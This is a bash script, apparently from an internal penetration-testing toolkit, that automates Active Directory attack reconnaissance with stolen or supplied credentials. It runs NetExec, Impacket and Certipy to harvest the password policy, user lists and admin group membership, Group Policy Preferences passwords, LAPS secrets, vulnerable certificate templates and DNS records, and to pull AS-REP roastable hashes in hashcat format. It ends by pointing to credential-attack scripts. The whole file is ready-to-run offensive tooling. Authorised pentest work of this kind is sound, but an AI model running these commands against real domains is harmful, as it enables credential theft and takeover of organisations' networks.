#!/bin/bash

#
# Internal Pentest - Active Directory Enumeration Script
# Comprehensive AD enumeration using NetExec and Impacket
#
# Usage: ./ad-enum.sh <DC_IP> <DOMAIN> <USERNAME> <PASSWORD>
#
# Example: ./ad-enum.sh 10.0.0.1 corp.local jsmith 'P@ssw0rd!'
#

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Check arguments
if [ "$#" -lt 4 ]; then
    echo -e "${RED}[!] Usage: $0 <DC_IP> <DOMAIN> <USERNAME> <PASSWORD>${NC}"
    echo -e "${BLUE}[*] Example: $0 10.0.0.1 corp.local jsmith 'P@ssw0rd!'${NC}"
    exit 1
fi

DC_IP="$1"
DOMAIN="$2"
USER="$3"
PASS="$4"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTPUT_DIR="../outputs/netexec"
CERTIPY_DIR="../outputs/certipy"
TARGETS_DIR="../targets"

echo -e "${BLUE}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║  Internal Pentest - AD Enumeration (Phase 2)               ║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${NC}"
echo -e "${BLUE}[*] DC: ${DC_IP}${NC}"
echo -e "${BLUE}[*] Domain: ${DOMAIN}${NC}"
echo -e "${BLUE}[*] User: ${USER}${NC}"
echo -e "${BLUE}[*] Timestamp: ${TIMESTAMP}${NC}"
echo ""

# Create directories
mkdir -p "$OUTPUT_DIR" "$CERTIPY_DIR" "$TARGETS_DIR"

# Verify credentials
echo -e "${CYAN}━━━ Credential Verification ━━━${NC}"
echo -e "${BLUE}[*] Testing credentials...${NC}"
netexec smb "$DC_IP" -u "$USER" -p "$PASS" 2>/dev/null
echo ""

run_enum() {
    local name="$1"
    local cmd="$2"
    echo -e "${BLUE}[*] ${name}...${NC}"
    eval "$cmd" 2>/dev/null || echo -e "${YELLOW}[!] Warning: ${name} may have failed${NC}"
}

# ============================================================
# STEP 1: Domain Information
# ============================================================
echo -e "${CYAN}━━━ Step 1: Domain Information ━━━${NC}"

run_enum "Domain info" \
    "netexec ldap '$DC_IP' -u '$USER' -p '$PASS' --get-domain-info | tee '${OUTPUT_DIR}/domain_info_${TIMESTAMP}.txt'"

# ============================================================
# STEP 2: Password Policy
# ============================================================
echo -e "\n${CYAN}━━━ Step 2: Password Policy ━━━${NC}"

run_enum "Password policy" \
    "netexec smb '$DC_IP' -u '$USER' -p '$PASS' --pass-pol | tee '${OUTPUT_DIR}/pass_pol_${TIMESTAMP}.txt'"

echo -e "${MAGENTA}[!] Review password policy before any spraying attempts!${NC}"

# ============================================================
# STEP 3: User Enumeration
# ============================================================
echo -e "\n${CYAN}━━━ Step 3: User Enumeration ━━━${NC}"

run_enum "All domain users" \
    "netexec ldap '$DC_IP' -u '$USER' -p '$PASS' --users | tee '${OUTPUT_DIR}/domain_users_${TIMESTAMP}.txt'"

# Extract usernames for target lists
netexec ldap "$DC_IP" -u "$USER" -p "$PASS" --users 2>/dev/null | awk '{print $5}' | grep -v '\[' | grep -v '^$' > "$TARGETS_DIR/domain-users.txt" 2>/dev/null || true
USER_COUNT=$(wc -l < "$TARGETS_DIR/domain-users.txt" 2>/dev/null | tr -d ' ')
echo -e "${GREEN}[+] ${USER_COUNT} users extracted → ${TARGETS_DIR}/domain-users.txt${NC}"

# ============================================================
# STEP 4: Group Enumeration
# ============================================================
echo -e "\n${CYAN}━━━ Step 4: Group Enumeration ━━━${NC}"

run_enum "All domain groups" \
    "netexec ldap '$DC_IP' -u '$USER' -p '$PASS' --groups | tee '${OUTPUT_DIR}/domain_groups_${TIMESTAMP}.txt'"

run_enum "Domain Admins membership" \
    "netexec ldap '$DC_IP' -u '$USER' -p '$PASS' -M groupmembership -o GROUP='Domain Admins' | tee '${OUTPUT_DIR}/domain_admins_${TIMESTAMP}.txt'"

run_enum "Enterprise Admins membership" \
    "netexec ldap '$DC_IP' -u '$USER' -p '$PASS' -M groupmembership -o GROUP='Enterprise Admins' | tee '${OUTPUT_DIR}/enterprise_admins_${TIMESTAMP}.txt'"

run_enum "Admin count users" \
    "netexec ldap '$DC_IP' -u '$USER' -p '$PASS' --admin-count | tee '${OUTPUT_DIR}/admin_count_${TIMESTAMP}.txt'"

# ============================================================
# STEP 5: Share Enumeration
# ============================================================
echo -e "\n${CYAN}━━━ Step 5: Share Enumeration ━━━${NC}"

if [ -f "$TARGETS_DIR/live-hosts.txt" ]; then
    run_enum "Accessible shares (all hosts)" \
        "netexec smb '$TARGETS_DIR/live-hosts.txt' -u '$USER' -p '$PASS' --shares | tee '${OUTPUT_DIR}/shares_${TIMESTAMP}.txt'"
else
    run_enum "Accessible shares (DC only)" \
        "netexec smb '$DC_IP' -u '$USER' -p '$PASS' --shares | tee '${OUTPUT_DIR}/shares_${TIMESTAMP}.txt'"
fi

# ============================================================
# STEP 6: GPO & GPP Enumeration
# ============================================================
echo -e "\n${CYAN}━━━ Step 6: GPO & GPP Enumeration ━━━${NC}"

run_enum "GPO enumeration" \
    "netexec ldap '$DC_IP' -u '$USER' -p '$PASS' -M get-gpo | tee '${OUTPUT_DIR}/gpos_${TIMESTAMP}.txt'"

run_enum "GPP passwords (cpassword)" \
    "netexec smb '$DC_IP' -u '$USER' -p '$PASS' -M gpp_password | tee '${OUTPUT_DIR}/gpp_passwords_${TIMESTAMP}.txt'"

# ============================================================
# STEP 7: Additional Checks
# ============================================================
echo -e "\n${CYAN}━━━ Step 7: Additional Checks ━━━${NC}"

run_enum "LAPS check" \
    "netexec ldap '$DC_IP' -u '$USER' -p '$PASS' -M laps | tee '${OUTPUT_DIR}/laps_${TIMESTAMP}.txt'"

run_enum "Machine Account Quota" \
    "netexec ldap '$DC_IP' -u '$USER' -p '$PASS' -M maq | tee '${OUTPUT_DIR}/maq_${TIMESTAMP}.txt'"

run_enum "Delegation check" \
    "netexec ldap '$DC_IP' -u '$USER' -p '$PASS' --trusted-for-delegation | tee '${OUTPUT_DIR}/delegation_${TIMESTAMP}.txt'"

# ============================================================
# STEP 8: ADCS Enumeration (Certipy)
# ============================================================
echo -e "\n${CYAN}━━━ Step 8: ADCS Enumeration ━━━${NC}"

if command -v certipy &> /dev/null; then
    run_enum "ADCS find (all templates)" \
        "certipy find -u '${USER}@${DOMAIN}' -p '$PASS' -dc-ip '$DC_IP' -stdout | tee '${CERTIPY_DIR}/certipy_find_${TIMESTAMP}.txt'"

    run_enum "ADCS vulnerable templates" \
        "certipy find -u '${USER}@${DOMAIN}' -p '$PASS' -dc-ip '$DC_IP' -vulnerable -stdout | tee '${CERTIPY_DIR}/certipy_vulnerable_${TIMESTAMP}.txt'"

    # Check for ESC findings
    if grep -qi "ESC" "${CERTIPY_DIR}/certipy_vulnerable_${TIMESTAMP}.txt" 2>/dev/null; then
        echo -e "${MAGENTA}[!] ADCS ESC vulnerabilities found! Review ${CERTIPY_DIR}/certipy_vulnerable_${TIMESTAMP}.txt${NC}"
    fi
else
    echo -e "${YELLOW}[!] certipy not found. Install with: pip install certipy-ad${NC}"
    echo -e "${YELLOW}[!] Skipping ADCS enumeration${NC}"
fi

# ============================================================
# STEP 9: DNS Enumeration
# ============================================================
echo -e "\n${CYAN}━━━ Step 9: DNS Enumeration ━━━${NC}"

if command -v adidnsdump &> /dev/null; then
    run_enum "AD DNS dump" \
        "adidnsdump -u '${DOMAIN}\\${USER}' -p '$PASS' '$DC_IP' 2>&1 | tee '${OUTPUT_DIR}/dns_dump_${TIMESTAMP}.txt'"
else
    echo -e "${YELLOW}[!] adidnsdump not found. Install with: pip install adidnsdump${NC}"
fi

# ============================================================
# STEP 10: Kerberos Checks
# ============================================================
echo -e "\n${CYAN}━━━ Step 10: Kerberos Pre-Checks ━━━${NC}"

if command -v impacket-GetUserSPNs &> /dev/null; then
    run_enum "Kerberoastable accounts (list only)" \
        "impacket-GetUserSPNs -dc-ip '$DC_IP' '${DOMAIN}/${USER}:${PASS}' | tee '${OUTPUT_DIR}/kerberoastable_${TIMESTAMP}.txt'"

    run_enum "AS-REP roastable accounts" \
        "impacket-GetNPUsers -dc-ip '$DC_IP' '${DOMAIN}/' -usersfile '$TARGETS_DIR/domain-users.txt' -format hashcat 2>&1 | grep -v 'not found\|Impacket' | tee '${OUTPUT_DIR}/asrep_check_${TIMESTAMP}.txt'"
else
    echo -e "${YELLOW}[!] Impacket not found. Install with: pip install impacket${NC}"
fi

# ============================================================
# SUMMARY
# ============================================================
echo -e "\n${GREEN}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║  AD Enumeration Complete                                   ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  ${BLUE}Domain Users:${NC}        ${GREEN}${USER_COUNT}${NC}"
echo -e "  ${BLUE}Output Directory:${NC}    ${OUTPUT_DIR}/"
echo -e "  ${BLUE}ADCS Output:${NC}         ${CERTIPY_DIR}/"
echo -e "  ${BLUE}User List:${NC}           ${TARGETS_DIR}/domain-users.txt"
echo ""
echo -e "${GREEN}[+] Key Files to Review:${NC}"
echo -e "  - Password policy: ${OUTPUT_DIR}/pass_pol_${TIMESTAMP}.txt"
echo -e "  - Domain Admins: ${OUTPUT_DIR}/domain_admins_${TIMESTAMP}.txt"
echo -e "  - GPP passwords: ${OUTPUT_DIR}/gpp_passwords_${TIMESTAMP}.txt"
echo -e "  - Kerberoastable: ${OUTPUT_DIR}/kerberoastable_${TIMESTAMP}.txt"
echo -e "  - ADCS vulns: ${CERTIPY_DIR}/certipy_vulnerable_${TIMESTAMP}.txt"
echo ""
echo -e "${GREEN}[+] Next Steps:${NC}"
echo -e "  1. Run BloodHound collection: ${CYAN}./bloodhound-collection.sh $DC_IP $DOMAIN $USER '$PASS'${NC}"
echo -e "  2. Review ADCS findings for ESC vulnerabilities"
echo -e "  3. Start credential attacks: ${CYAN}./credential-attacks.sh [INTERFACE] $DC_IP $DOMAIN${NC}"
echo -e "  4. Check Kerberoastable accounts for high-value targets"
